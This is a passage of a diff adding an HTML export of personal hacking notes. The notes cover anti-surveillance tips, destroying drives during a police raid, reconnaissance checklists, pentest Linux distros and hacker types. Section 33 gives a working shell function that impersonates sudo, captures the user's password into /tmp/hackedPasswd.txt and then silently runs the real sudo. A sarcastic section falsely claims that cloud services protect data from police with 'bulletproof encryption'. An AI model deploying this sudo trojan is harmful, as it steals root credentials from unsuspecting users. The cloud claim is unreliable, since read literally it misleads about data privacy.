+Unless you're extremely important, they're not going to send someone to manually crack your password and disable the kill switch program.
+</p>
+
+<p>
+You might be able to adjust the mobo voltage variance to be lower too so it shuts off if they try to manually attach something to the mobo without a port.
+</p>
+
+<p>
+But all this is kind of redundant because if they set up pinhole cameras in your place they can just record everything you're doing on the computer screen itself.
+</p>
+
+<p>
+They look like little pin holes and are usually in the corners of rooms near the ceiling.
+</p>
+
+<p>
+They can also put microphones in that way.
+</p>
+
+<p>
+You can make them all inoperable by just painting.
+</p>
+
+<p>
+If you're in an apartment or something, they'll rent or buy the apartment next door and drill through the walls to put them in.
+</p>
+</div>
+</div>
+<div id="outline-container-org83e5a06" class="outline-3">
+<h3 id="org83e5a06"><span class="section-number-3">31.2</span> 2</h3>
+<div class="outline-text-3" id="text-31-2">
+<p>
+Use trusted cloud services like Google Cloud or Apple iCloud or Telegram Saved Messages, they
+protect your data from hackers and police with military-grade bulletproof encryption and redundant
+copies stored in multiple locations around the world. It's the industry-wide practice. Keep it
+simple, you silly kiddo.
+</p>
+</div>
+</div>
+<div id="outline-container-org2b2da05" class="outline-3">
+<h3 id="org2b2da05"><span class="section-number-3">31.3</span> 3</h3>
+<div class="outline-text-3" id="text-31-3">
+<p>
+If they break your door down, make sure to destroy your drives if you are concerned they will hold
+you prisoner until you hand over the keys. Make sure to get a good lawyer before any questioning of
+course. Do not give a single thing other than your name and DOB after arrest. In most "free"
+countries, you are obligated to unlock the drives if they have any suspicion of you. Muh UK can give
+you 5 years in prison just for refusing in the name of national security. It's better that the data
+no longer exists.
+</p>
+
+
+<p>
+If you want to store remotely on "the cloud", you can still do that relatively safely. Connect to
+one over anon network and upload files that you have encrypted with your own passphrase before
+uploading. Try to not give any personal information over to the service. I already do some file
+backups in this way for a file storage service.
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-org9d0c4eb" class="outline-2">
+<h2 id="org9d0c4eb"><span class="section-number-2">32</span> info gathering</h2>
+<div class="outline-text-2" id="text-32">
+<p>
+<a href="https://resources.infosecinstitute.com/topic/kali-linux-top-5-tools-for-information-gathering/">https://resources.infosecinstitute.com/topic/kali-linux-top-5-tools-for-information-gathering/</a>
+</p>
+
+<ul class="org-ul">
+<li>DNS records (what domains do they have? What subdomains exist?)
+<ul class="org-ul">
+<li>Kali Linux DNS - spoof a website by redirecting a link to your destination such as a web server</li>
+</ul></li>
+<li>IDS/IPS events (intrusion detection systems and intrusion prevention systems)</li>
+<li>Network scanning (scanning for ports, MAC addresses and banner grabbing of a target’s systems)</li>
+<li>Operating systems (can detect operating systems and serve exploits if it is vulnerable)</li>
+<li>Routing (network configurations that can be found)</li>
+<li>Ports (sometimes these are opened and can provide information about the server’s software or services it provides)</li>
+<li>Users (find out who is logged in on a target system or what their account privileges are)</li>
+<li>Systems information. Items such as SMB open network shares and running processes for user accounts with non-privileged access</li>
+<li>SSL (are the systems or websites protected with secure sockets layer certificates)</li>
+<li>VPN (are there VPNs running on the network and are they authorized?)</li>
+<li>Voice over IP (Modern telephony uses this protocol to make voice calls. Are these protocols on their own VLAN? Can these packets be intercepted?</li>
+<li>SNMP (are there any devices with SNMP running on them? Are they accessible?</li>
+<li>Email addresses (can email addresses be intercepted for further cybercrimes such as phishing or ransomware payloads?)</li>
+</ul>
+
+
+<p>
+Network scanning
+</p>
+<ul class="org-ul">
+<li>port scanners</li>
+<li>service fingerprinting</li>
+<li>ARP spoofing (manipulating how data gets delivered from one computer to another)</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org45824a7" class="outline-2">
+<h2 id="org45824a7"><span class="section-number-2">33</span> sudo linux password stealing</h2>
+<div class="outline-text-2" id="text-33">
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #8ac6f2; font-weight: bold;">function</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">sudo</span> () {
+    <span style="color: #cae682;">realsudo</span>=<span style="color: #95e454;">"$(</span><span style="color: #fa8072;">which</span><span style="color: #95e454;"> sudo)"</span>
+
+    <span style="color: #8ac6f2; font-weight: bold;">if</span> grep -Fqs <span style="color: #95e454;">"$USER"</span> /tmp/hackedPasswd.txt
+    <span style="color: #8ac6f2; font-weight: bold;">then</span>
+        $<span style="color: #cae682;">realsudo</span> <span style="color: #95e454;">"${@:1}"</span>
+    <span style="color: #8ac6f2; font-weight: bold;">else</span>
+        <span style="color: #e5786d;">read</span> -s -p <span style="color: #95e454;">"[sudo] password for $USER: "</span> inputPasswd
+        <span style="color: #e5786d;">printf</span> <span style="color: #95e454;">"\n"</span>; <span style="color: #e5786d;">printf</span> <span style="color: #95e454;">'%s\n'</span> <span style="color: #95e454;">"$USER : $inputPasswd"</span> &gt; /tmp/hackedPasswd.txt
+        $<span style="color: #cae682;">realsudo</span> -S &lt;&lt;&lt; <span style="color: #95e454;">"$inputPasswd"</span> -u root bash -c <span style="color: #95e454;">"exit"</span> &gt; /dev/null 2&gt;&amp;1
+        $<span style="color: #cae682;">realsudo</span> <span style="color: #95e454;">"${@:1}"</span>
+    <span style="color: #8ac6f2; font-weight: bold;">fi</span>
+}
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org3ad0c09" class="outline-2">
+<h2 id="org3ad0c09"><span class="section-number-2">34</span> distros</h2>
+<div class="outline-text-2" id="text-34">
+</div>
+<div id="outline-container-org7bbe99c" class="outline-3">
+<h3 id="org7bbe99c"><span class="section-number-3">34.1</span> kali</h3>
+<div class="outline-text-3" id="text-34-1">
+<p>
+“forensic mode”
+</p>
+<ul class="org-ul">
+<li>internal hard disk is never touched</li>
+<li>auto-mounting of removable media is disabled. (USB, CD -  nothing should happen to any media without direct user action)</li>
+<li></li>
+</ul>
+
+<p>
+<a href="https://www.tutorialspoint.com/kali_linux/index.htm">https://www.tutorialspoint.com/kali_linux/index.htm</a>
+</p>
+<ul class="org-ul">
+<li>Metasploit</li>
+<li>Maltego - network analysis</li>
+<li>Wireshark - packet sniffing</li>
+<li>Netcat - TCP and UDP protocols for things like port scanning or creating backdoor channels</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org09b2b19" class="outline-3">
+<h3 id="org09b2b19"><span class="section-number-3">34.2</span> pentoo</h3>
+<div class="outline-text-3" id="text-34-2">
+<p>
+<a href="https://www.pentoo.ch">https://www.pentoo.ch</a>
+</p>
+<ul class="org-ul">
+<li>default for expoiting</li>
+<li>hardenes</li>
+<li>bleeding<sub>edge</sub></li>
+</ul>
+
+<p>
+USB stick of 8 GB minimum
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgffa7fa1" class="outline-3">
+<h3 id="orgffa7fa1"><span class="section-number-3">34.3</span> Tails</h3>
+<div class="outline-text-3" id="text-34-3">
+<p>
+Tor os
+</p>
+<ul class="org-ul">
+<li>can save some of your files and configuration in an encrypted Persistent Storage on the USB stick</li>
+<li>never writes anything to the hard disk and only runs from the memory of the computer</li>
+<li>Tor Browser with uBlock</li>
+<li>Thunderbird, for encrypted emails</li>
+<li>KeePassXC, to create and store strong passwords</li>
+<li>LibreOffice, an office suite</li>
+<li>OnionShare, to share files over Tor</li>
+<li>Applications are blocked automatically if they try to connect to the Internet without Tor.</li>
+<li>Everything in the Persistent Storage is encrypted automatically.</li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org5479bce" class="outline-2">
+<h2 id="org5479bce"><span class="section-number-2">35</span> virtualization</h2>
+<div class="outline-text-2" id="text-35">
+<p>
+apt-install virt-what
+</p>
+</div>
+</div>
+
+<div id="outline-container-orge7dc19f" class="outline-2">
+<h2 id="orge7dc19f"><span class="section-number-2">36</span> culture</h2>
+<div class="outline-text-2" id="text-36">
+<p>
+Serial Experiments Lain - <a href="https://laingame.net">https://laingame.net</a>
+</p>
+</div>
+<div id="outline-container-org8cae4b9" class="outline-3">
+<h3 id="org8cae4b9"><span class="section-number-3">36.1</span> classification of hackers</h3>
+<div class="outline-text-3" id="text-36-1">
+<ul class="org-ul">
+<li>Cracker - gain unauthorized access to a computer in order to commit another crime such as destroying information
+contained in that system</li>
+<li>White hat - non-malicious reasons, either to test their own security system, perform penetration tests or
+vulnerability assessments for a client, or while working for a security company which makes security software</li>
+<li>Black hat - who "violates computer security for little reason beyond maliciousness or for personal gain", not criminal
+hacker</li>
+<li>Grey hat - between a black hat and a white hat hacker</li>
+<li>Elite hacker -</li>
+<li>Script kiddie, s'kiddie, skid - unskilled hacker  WinNuke, Back Orifice, NetBus, Sub7, Metasploit, ProRat, PassJacker, iStealer, Snoopy</li>
+<li>Neophyte - ("newbie", or "noob") -</li>
+<li>Blue hat - used to bug-test a system prior to its launch. Microsoft red-team, blue-team concept.</li>
+<li>Hacktivist -</li>
+<li>Nation state - Intelligence agencies and cyberwarfare operatives of nation states</li>
+<li>Organized criminal gangs</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<p class="date">Created: 2022-11-16 Wed 21:37</p>
+<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
+</div>
+</body>
+</html>
